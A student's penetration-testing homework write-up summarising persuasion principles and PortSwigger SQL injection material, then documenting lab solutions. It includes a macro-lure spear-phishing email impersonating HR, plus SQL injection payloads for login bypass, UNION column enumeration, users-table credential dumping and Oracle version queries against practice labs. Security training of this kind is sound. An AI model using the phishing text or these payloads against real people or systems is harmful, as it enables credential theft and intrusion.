# [Homework 4 Sequel fish](https://terokarvinen.com/2023/tunkeutumistestaus-2023-kevat/#h4-sequel-fish)

### x) Read and summarize

[Cialdini's 6 Principles of Persuasion: A Simple Sumary](https://worldofwork.io/2019/07/cialdinis-6-principles-of-persuasion/)

1 Reciprocity 
	- Humans value equality and balance
	- Owing other people doens't feel good which makes people return favors
	- Favors need to be subtle enough to get the most advantage of returning favors
2 Scarcity
	- Limiting availability increases interest towards the product, service, idea or thing you are offering
	- Time pressure and limited availability create a sense of scarcity
3 Authority
	- Authority gives power to influence people because it builds trust
	- Others promoting your brilliance and authority increases your ability to persuade or influence people regardless of who promotes you
	- Building trust, credibility and authority increases your ability to persuade or influence others
4 Commitment and consistency
	- Convincing people to act a certain way makes it more probable for them to act similarly in the future
	- Making cheap and easy offers influence people to come back or to accept your bigger and more costly offers
5 Liking
	- Complimenting or cooperating with others makes them like you more
	- You are more likely to be influenced by the people you like or are similar with
6 Consensus
	- In persuasion it's beneficial to use more specific social proof instead of generic ones

[SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

- Union attacks make it possible to execute more than one `SELECT` queries and append the results
- Union attacks have two requirements
	- Individual queries must return the same number of columns
	- Data types in each column must be compatible between the individual queries
- You can determine the number of columns required for UNION attacks with `ORDER BY` or with `UNION SELECT`
- Usually the interesting data is in string form and you can find which columns hold string data by submitting multiple `UNION SELESCT` payloads

[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

- Comment rest of the query out with `--comment`
	- In MySQL you need a space after the doulbe dash `-- comment`
- List existing tables with `SELECT * FROM information_schema.tables` or with `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
	- In Oracle you use `SELECT * FROM all_tables` or `SELECT *FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
- Batched/stacked queries `QUERY-1-HERE; QUERY-2-HERE` don't work in Oracle databases

### a) Make a spear phishing message for imaginary company which purpose is to make someone open the attached Excel file with macros turned on

In the following message I pretend to be from the companys HR department which uses authority to influence people to open
the malicious Excel file. I also used scarcity with time pressure to make people not think logically and to influence their emotions for
the fear of not getting paid. Not being paid could also work as a way to show scarcity if some of the workers struggled
financially if the salary was late. The attachment might also work as a way make people feel like they owe to reply fast because
the HR department has sent a file which makes filling the hours easier and it even tells you how much you are paid. 

Title: Error in payday calculations

We had an error while calculating salaries for this weeks payday. Some of the data of hours worked was corrupted
and we need everyone to manually submit their hours done for the past 2 weeks. Getting worked hours is very urgent
to pay the salaries in time. 

Attached is an Excel file where you can enter your hours worked and it will automatically calculate your hours and overtime and show you how much you should be paid.
You can send the file back as a reply to this email after it has been filled.
After opening the attachment remember to click "Enable Editing" and "Enable Content" from the yellow bar above.

Thank you,
HR department

## Proof of completed labs

![image](https://user-images.githubusercontent.com/52470440/236649627-92a0db65-5880-4c25-8fc7-417ed88cea38.png)

### b) [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

The first step was to head to the login page

I tried to log in with a few default account credentials like admin-admin, root-root, user-user, guest-guest but they didn't work as expected

I tried to search from the internet for SQL injection login bypasses and found an article by [Geeks for Geeks](https://www.geeksforgeeks.org/authentication-bypass-using-sql-injection-on-login-page/).
I tried to comment things out but they didn't really work.

I saw some writing in the first picture of the article and decided to try that

	Username: '
	Password: password=""

And I got an error 

![image](https://user-images.githubusercontent.com/52470440/236649542-571f44a3-462d-45aa-90e6-26b3e81c98ea.png)

I continued reading the article and tried

	Username: Select id from users where username='username' and password='password' or 1=1--+

![image](https://user-images.githubusercontent.com/52470440/236649546-d370f1a2-ce3b-49bd-b250-2aca4d802803.png)

I got the same _Internal Server Error_ message as earlier and a tried a few different variations with the same payload but they didn't work either

I tried to make the payload shorter and still comment everything after password out 

	Username: rst
	Password: ' or 1=1--

But I still couldn't progress so I continued reading and saw that in the example they had a plus sign after two hyphens

	Username: rst
	Password: ' or 1=1--+

And I got in

![image](https://user-images.githubusercontent.com/52470440/236649550-98620e88-d5f4-456c-a9f1-f27a0f3fe0f3.png)

### c) [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

I started by opening _Accessories_ category and headed to the url

	' ORDER BY 1--

![image](https://user-images.githubusercontent.com/52470440/236649551-60cec26e-ddd2-4b73-967e-f8ba050b4b5e.png)

	' ORDER BY 2--
	' ORDER BY 3--

![image](https://user-images.githubusercontent.com/52470440/236649556-15fec295-390f-45c9-a161-b2e1727f29b1.png)

	' ORDER BY 4--

![image](https://user-images.githubusercontent.com/52470440/236649553-91e02222-a1fc-4eed-a14d-b7d93c694a5e.png)

I got an error and I wanted to confirm the error with using the other method described in [SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

	' UNION SELECT NULL, NULL, NULL--

And I suddenly got a message that I had solved the lab

![image](https://user-images.githubusercontent.com/52470440/236649558-dd6749fd-4eab-4146-a78d-e72f932c75e7.png)

### d) [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

I started by opening _Lifestyle_ category and headed to the url

	' UNION SELECT NULL--

![image](https://user-images.githubusercontent.com/52470440/236649562-6b0d1ab9-c36d-4a93-9baf-cabe1fbbda3e.png)

I didn't expect to get an error with my first try so I changed the attack method

	' ORDER BY 1--
	' ORDER BY 2--
	' ORDER BY 3--
	' ORDER BY 4--

![image](https://user-images.githubusercontent.com/52470440/236649565-10d179b9-fa00-4c3f-b414-ccd43f74768e.png)

And I finally got an Internal Server Error and answer to how many columns the query returns

I was instructed to determine which columns are compatible with string data so finding that out was my next task

	' UNION SELECT 'a', NULL, NULL--
	' UNION SELECT NULL, 'a', NULL--

![image](https://user-images.githubusercontent.com/52470440/236649568-4ab989ce-d20e-4b32-b4c1-a52e07c99fa1.png)

I didn't get any errors which told me that the second column is compatible with string data but I still wanted to check
if the third column could also hold string data

	' UNION SELECT NULL, NULL, 'a'--

But I got the same _Internal Server Error_ as many times before

My next step was to retrieve the string "xpj4cO"

	' UNION SELECT NULL, 'xpj4cO', NULL--

![image](https://user-images.githubusercontent.com/52470440/236649572-2c0eaac0-7e26-476e-a221-958a92471ff9.png)

And the lab was completed

### e) [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

In the instructions I've been told to retrieve data from table called users and there is direct steps for doing that in
[SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks) article

I open _Gifts_ category and head to the url

	' UNION SELECT username, password FROM users--

![image](https://user-images.githubusercontent.com/52470440/236649578-5dd6a02b-9f7f-400b-8194-e6dd0a3ab7c2.png)
![image](https://user-images.githubusercontent.com/52470440/236649583-7ac9fc98-5708-448c-a06d-998e0f102170.png)
![image](https://user-images.githubusercontent.com/52470440/236649586-270e5f8c-3701-4409-a4cc-ff227461fecb.png)

And I got an access to multiple different accounts on the first try

I head to _My account_ in the top right corner and try to log in as administrator

	Username: administrator
	Password: aob2dgdvhexvs8nndbpm

![image](https://user-images.githubusercontent.com/52470440/236649589-cb6175cd-29c0-46d5-9d6d-a3899226bd3e.png)

### f) [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

Again I am instructed to gain access to _administrator_ by using UNION attack to retrieve _username_ and _password_ from _users_

I decide to try the same steps as in the previous exercise. I open _Gifts_ category and head to the url

	' UNION SELECT username, password FROM users--

And I get _Internal Server Error_. As expected I didn't get the credentials on the first attempt

I head back to the url to try steps used in the other completed labs

	' ORDER BY 1--
	' ORDER BY 2--
	' ORDER BY 3--

The first two work but `' ORDER BY 3--` doesn't and I try the next thing which is finding out if the columns can contain strings

	' UNION SELECT 'a', NULL--
	' UNION SELECT NULL, 'a'--

The first attempt  gives me an error but the second one works

![image](https://user-images.githubusercontent.com/52470440/236649595-9caa8944-c353-429c-bc9f-aea120a45126.png)

Because I wasn't sure how to get username and password from single column I once again check [SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
article which has more ideas I can try

	' UNION SELECT NULL, username || '~' || password FROM users--

![image](https://user-images.githubusercontent.com/52470440/236649597-0ed4dee1-7f4d-4e94-86bf-d8f74bcf3e32.png)

And it works

I head to _My account_ page 

	Username: administrator
	Password: a539k952964c6k054co3

![image](https://user-images.githubusercontent.com/52470440/236649601-e2196b3b-f770-4013-8492-118ff1b5cb66.png)

### g) [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

This time the instructions were a bit different than the previous ones. I was told that I'm dealing with Oracle database in the title of the task.
I was supposed to retrieve the version information about the database and I remembered there were commands about that in
the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) I read in exercise x

I started the lab and opened _Gifts_ category and headed to the url

	' SELECT banner FROM v$version--
	' SELECT version FROM v$instance--

I only got errors so I needed to start from the first steps and to find out how many columns there were

	' order by 1--
	' order by 2--
	' order by 3--

I got an error on the third attempt so I had two columns to work with and it was time to find out if they could hold string data

	' UNION SELECT 'a', NULL--
	' UNION SELECT NULL, 'a'--

I got errors on both attempts which to my knowledge said neither of the columns could have string data

I went back to the previous step of finding out how many columns there are

	' order by 1--
	' order by 2--

And I found out that the first column is the title of the products and the second column is the description for the products.
I wasn't sure how to use this knowledge to my advantage so I checked the articles again.
I didn't find any help from the articles so I checked hint for the lab

	' UNION SELECT NULL FROM DUAL--
	' UNION SELECT 'a' FROM DUAL--

Neither of those payloads gave me any new information but then I remembered there was two columns and I was only checking one column from _DUAL_

	' UNION SELECT NULL, NULL FROM dual--

![image](https://user-images.githubusercontent.com/52470440/236649606-b3b5faba-0c58-47fa-94f5-bef189e095f2.png)

Now it was time to test if either of the columns in _DUAL_ could have strings in the payload

	' UNION SELECT 'a', NULL FROM dual--
	' UNION SELECT 'a', 'a' FROM dual--

Both worked and it was time to check the articles again to see if I could come up with a payload to get the version information about the database

After some trial and error with combining `' SELECT banner FROM v$version--` and `' SELECT version FROM v$instance--`
I remembered there is two columns and one table so I can't combine the two

	' union select banner, null from v$version--

And I finally solved the lab!!

I didn't want to take multiple screenshots of the completed lab but I wanted to show all of the retrieved data so I got an idea.
I had previously found out that the first column stores the titles of the products so I could maybe use that to my advantage to get
the retrieved data on top of the product list

	' union select 'A', banner from v$version--

![image](https://user-images.githubusercontent.com/52470440/236649611-4fdc27f5-fded-4243-8d3e-4276c67c84bd.png)

And with a bit of trial and error I managed to find to a way to make it!

## Sources: 

[Penetration testing course by Tero Karvinen](https://terokarvinen.com/2023/tunkeutumistestaus-2023-kevat/)

https://worldofwork.io/2019/07/cialdinis-6-principles-of-persuasion/

https://portswigger.net/web-security/sql-injection/union-attacks

https://portswigger.net/web-security/sql-injection/cheat-sheet

https://www.geeksforgeeks.org/authentication-bypass-using-sql-injection-on-login-page/

